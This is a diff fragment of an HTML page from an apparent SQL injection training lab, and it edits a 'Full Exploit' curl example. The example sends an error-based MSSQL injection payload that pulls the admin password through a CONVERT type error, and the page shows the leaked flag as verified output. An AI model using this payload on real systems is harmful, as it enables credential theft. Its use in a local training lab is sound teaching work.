@@ -122,7 +122,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mssql/lab2" \<br> --data-urlencode "username=' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin')) -- -" \<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab2" \<br> --data-urlencode "username=' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin')) -- -" \<br>
         &nbsp;&nbsp;--data-urlencode "password=x"<br><br>
         <span class="prompt"># Verified output:</span><br>
         MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_c0nv3rt_c4st_3rr0r}' to data type int.
